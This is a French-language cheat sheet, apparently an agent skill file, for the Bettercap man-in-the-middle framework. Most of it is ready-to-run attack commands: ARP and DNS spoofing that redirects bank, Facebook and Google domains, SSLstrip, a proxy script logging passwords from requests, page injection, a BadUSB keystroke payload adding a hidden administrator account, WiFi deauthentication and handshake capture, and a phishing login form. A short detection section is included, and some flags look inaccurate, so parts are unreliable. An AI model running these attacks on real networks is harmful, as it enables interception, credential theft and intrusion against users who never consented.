---
name: bettercap
description: Bettercap — MITM framework, ARP spoofing, DNS spoofing, HTTP/HTTPS interception, credential harvesting, session hijacking, Beacon C2 detection, HID attacks, Bluetooth, WiFi, BLE, et modules avancés.
---

# Bettercap — Framework MITM Complet

## Présentation

Bettercap est un framework d'attaque réseau (MITM) puissant, modulaire et extensible. Successeur moderne d'Ettercap.

**Installation :**
```bash
# Kali (pré-installé)
sudo apt install bettercap

# Dernière version
curl -L https://github.com/bettercap/bettercap/releases/latest/download/bettercap_linux_amd64.zip -o bettercap.zip
sudo unzip bettercap.zip -d /usr/local/bin/

# Interface web (mode interactif)
sudo bettercap -eval "set api.rest.username admin; set api.rest.password admin; api.rest on; ui on"
```

---

## Modes de lancement

```bash
# Mode interactif (console)
sudo bettercap -I eth0

# Mode interactif avec interface web
sudo bettercap -I eth0 -eval "ui on"
# → Interface web sur https://localhost:80 (proxy HTTP)

# Mode script (non-interactif)
sudo bettercap -I eth0 -S script.cap

# Mode headless (script)
sudo bettercap -I eth0 -T 192.168.1.100 --proxy

# Avec interface spécifique
sudo bettercap -I wlan0
```

---

## ARP Spoofing

```bash
# Activer ARP spoofing (toute la subnet)
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Cibler un hôte spécifique
set arp.spoof.targets 192.168.1.100
arp.spoof on

# Spoofing partiel (ne rerouter que le trafic sortant)
set arp.spoof.internal false
arp.spoof on

# Activer le forwarding automatique
set arp.spoof.fullduplex true
```

### Détection d'ARP spoofing
```bash
# Bettercap peut aussi détecter les attaquants sur le réseau
net.sniff on
net.show
# Chercher les adresses MAC dupliquées
```

---

## DNS Spoofing

```bash
# Configurer un fichier de DNS spoofing (dns.spoof.txt)
cat > /tmp/dns.spoof.txt << EOF
*.example.com 192.168.1.50
*.bank.com 192.168.1.50
login.facebook.com 192.168.1.50
*google.com 192.168.1.50
EOF

# Activer DNS spoofing
set dns.spoof.domains /tmp/dns.spoof.txt
dns.spoof on

# Rediriger toutes les requêtes DNS
set dns.spoof.all true
dns.spoof on

# Ne spoof que certaines adresses
set dns.spoof.address 192.168.1.50
```

---

## HTTP/HTTPS Proxy

### Interception HTTP
```bash
# Proxy HTTP transparent
set http.proxy.port 8080
http.proxy on

# HTTP/HTTPS proxy
set http.proxy.sslstrip true    # SSLstrip (HTTPS → HTTP)
http.proxy on
https.proxy on

# Redirection automatique (ARP + HTTP proxy)
set arp.spoof.targets 192.168.1.100
arp.spoof on
http.proxy on
```

### Script de capture de credentials HTTP
```bash
# Activer le module de capture
set http.proxy.script /usr/share/bettercap/caplets/http-request-basic-auth.cap
http.proxy on

# Ou créer son propre script
cat > /tmp/cred_capture.js << 'EOF'
function onRequest(req, res) {
    var body = req.ReadBody();
    if (body.indexOf("password") > -1 || body.indexOf("login") > -1) {
        console.log("[CRED] " + req.Host + " → " + body);
    }
}
function onResponse(req, res) { }
EOF

set http.proxy.script /tmp/cred_capture.js
http.proxy on
```

### Injecter du contenu dans les pages HTTP
```bash
# Injecter un script JS dans toutes les pages
cat > /tmp/inject_alert.js << 'EOF'
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') === 0) {
        var body = res.ReadBody();
        body = body.replace('</html>', '<script>alert("Hacked by Bettercap")</script></html>');
        res.SetBody(body);
    }
}
EOF

set http.proxy.script /tmp/inject_alert.js
http.proxy on
```

### HTTPS avec certificat auto-signé
```bash
# Meilleur que SSLStrip (plus récent)
set https.proxy.certificate /usr/local/share/bettercap/bettercap-cert.pem
https.proxy on

# Générer un certificat personnalisé
openssl req -x509 -newkey rsa:4096 -keyout /tmp/ca.key -out /tmp/ca.pem -days 365
set https.proxy.certificate /tmp/ca.pem
```

---

## Capture de paquets (sniffer)

### Sniffer de credentials
```bash
# Activer le sniffer
net.sniff on

# Sniffer verbose
set net.sniff.verbose true
net.sniff on

# Sniffer en local (pas de ARP spoofing)
set net.sniff.local true

# Filtrer les protocoles
set net.sniff.filter "tcp port 80 or tcp port 443"
net.sniff on

# Filtrer uniquement les credentials
net.sniff on
# → Capture automatiquement les mots de passe POST, FTP, IMAP, POP3, etc.
```

### Modules de capture spécifiques
```bash
# Module de capture de credentials complet
net.sniff on
# Affiche automatiquement :
#   - HTTP POST/GET params
#   - Basic auth
#   - FTP credentials
#   - SMTP/IMAP/POP3 credentials
#   - NTLMv1/v2 hashes
```

---

## HID (Human Interface Device) Attacks

```bash
# Attaque par clavier USB (BadUSB)
# Nécessite un Raspberry Pi Zero ou Teensy

# Créer un payload HID
hid.setup /dev/hidg0 keyboard

# Envoyer des frappes
hid.keyboard press "WIN"
hid.keyboard press "r"
hid.keyboard type "cmd.exe"
hid.keyboard press "ENTER"
hid.keyboard type "net user hacker P@ssw0rd /add"
hid.keyboard press "ENTER"
hid.keyboard type "net localgroup Administrators hacker /add"
```

---

## WiFi — Captures et attaques

```bash
# Scanner les réseaux WiFi
wifi.recon on

# Afficher les AP
wifi.show

# Afficher les clients
wifi.show.clients

# Déauthentifier un client
wifi.deauth 11:22:33:44:55:66

# Déauthentifier tous les clients d'un AP
wifi.deauth aa:bb:cc:dd:ee:ff

# Capturer le handshake WPA
wifi.recon on
# Attendre qu'un client se connecte
# Le handshake est capturé automatiquement
```

### WPA PMKID capture
```bash
wifi.recon on
# Bettercap capture automatiquement le PMKID
# Voir : logs, fichier pcap généré

# Convertir pour hashcat
hcxpcapngtool -o hash.22000 bettercap-wifi.pcap
```

---

## BLE (Bluetooth Low Energy)

```bash
# Scanner les devices BLE
ble.recon on
ble.show

# Enumerer les services d'un device
ble.enum 00:11:22:33:44:55

# Écouter les notifications
ble.write 00:11:22:33:44:55 handle data

# Spécifier l'interface
set bluetooth.hci hci0
ble.recon on
```

---

## Modules avancés

### HTTP/HTTPS server (phishing)
```bash
# Serveur HTTP malveillant
http.server on
http.server.path /tmp/pages

# Serveur HTTPS
set https.server.certificate /tmp/cert.pem
set https.server.key /tmp/key.pem
https.server on

# Phishing — page de login
cat > /tmp/pages/login.html << 'HTML'
<form action="/capture" method="POST">
    <input name="username" placeholder="Login"/>
    <input type="password" name="password" placeholder="Password"/>
    <input type="submit"/>
</form>
HTML
```

### TCP proxy (SSH interception potentielle)
```bash
# Proxy TCP générique
set tcp.proxy.address 0.0.0.0
set tcp.proxy.port 2222
tcp.proxy on
# Redirige le trafic TCP vers un port local
```

### Port scanning
```bash
# Scan de ports local
net.scan 192.168.1.0/24

# Scan spécifique
net.probe 192.168.1.100 22,80,443,445,3389,8080
```

### Event monitoring
```bash
# Activer les logs d'événements
set events.num.max 1000
events.stream on

# Filtrer les événements
events.show 100
events.clear

# Notification des nouveaux hosts
net.show
```

---

## Caplets (scripts Bettercap)

### Structure d'un caplet
```bash
# simple_arp_spoof.cap
# Ce script s'exécute automatiquement

net.probe on
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.internal true
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
http.proxy on
```

### Caplets intégrés
```bash
# Lister les caplets
/usr/share/bettercap/caplets/

# Exécuter un caplet
sudo bettercap -caplet http-req-dump
sudo bettercap -caplet update
sudo bettercap -caplet https-redirect
sudo bettercap -caplet arp-sniff
sudo bettercap -caplet mac-flood

# Caplets utiles
#   http-req-dump     → Capturer les requêtes HTTP
#   https-redirect    → Downgrade HTTPS → HTTP
#   arp-sniff         → ARP spoof + sniffer de base
#   mac-flood         → Flood de la table ARP
#   update            → Mettre à jour bettercap
```

### Caplet complet : Man-in-the-Middle total
```bash
cat > /tmp/full_mitm.cap << 'EOF'
# Paramètres réseau
set arp.spoof.targets 192.168.1.100
set arp.spoof.internal true
set arp.spoof.fullduplex true

# DNS spoofing
set dns.spoof.domains /tmp/dns.spoof.txt
dns.spoof on

# Proxy HTTP/HTTPS
set http.proxy.port 8080
http.proxy on
https.proxy on

# Sniffer
net.sniff on
set net.sniff.verbose true

# Events
events.stream on

# Afficher les options
help
EOF

# Exécuter
sudo bettercap -I eth0 -caplet /tmp/full_mitm.cap
```

---

## Détection de Bettercap / Anti-Bettercap

### Détection
```bash
# Vérifier l'ARP table
arp -a
# Si plusieurs entrées avec la même MAC → ARP spoofing

# Vérifier le forwarding
cat /proc/sys/net/ipv4/ip_forward
# Si = 1 → MITM possible

# Vérifier les port 8080, 80 non standards
netstat -tlnp | grep 8080
```

### Se protéger
```bash
# Contre ARP spoofing :
#   - Static ARP entries
sudo arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF

#   - ARP monitoring (arpwatch)
sudo apt install arpwatch

#   - VLAN isolation
#   - 802.1X avec port security
#   - Utiliser HTTPS partout (HSTS)
```

---

## Scénarios complets

### 1. ARP spoofing + Capture de credentials
```bash
sudo bettercap -I eth0
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> net.sniff on
> set net.sniff.verbose true
# Attendre les credentials...
```

### 2. DNS spoofing + Phishing
```bash
sudo bettercap -I eth0 -caplet /tmp/full_mitm.cap
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> set dns.spoof.domains /tmp/bank_spoof.txt
> dns.spoof on
> http.server on
> http.server.path /tmp/fake_bank/
```

### 3. SSLStrip + Session hijacking
```bash
sudo bettercap -I eth0
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> sslstrip on
> net.sniff on
```

### 4. WiFi WPA capture + PMKID
```bash
sudo bettercap -I wlan0
> wifi.recon on
> wifi.show
> wifi.deauth AA:BB:CC:DD:EE:FF
# Handshake capturé automatiquement
> quit
# Utiliser hcxpcapngtool → hashcat
```

### 5. BLE device enumeration
```bash
sudo bettercap
> ble.recon on
> ble.show
> ble.enum 00:11:22:33:44:55
> ble.write 00:11:22:33:44:55 0x0012 \x00
```

---

## Antisèche rapide

```bash
# Interface web
sudo bettercap -eval "set api.rest.username admin; set api.rest.password admin; api.rest on"

# ARP spoofing
sudo bettercap -I eth0 -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; net.sniff on"

# DNS spoofing
set dns.spoof.domains /tmp/domains.txt
dns.spoof on

# HTTP proxy + SSL Strip
http.proxy on; set http.proxy.sslstrip true

# WiFi capture
wifi.recon on; wifi.deauth AA:BB:CC:DD:EE:FF

# Caplet
sudo bettercap -I eth0 -caplet mon_script.cap

# Events
events.stream on

# Sniffer credentials
net.sniff on

# Scan réseau
net.probe on; net.show
```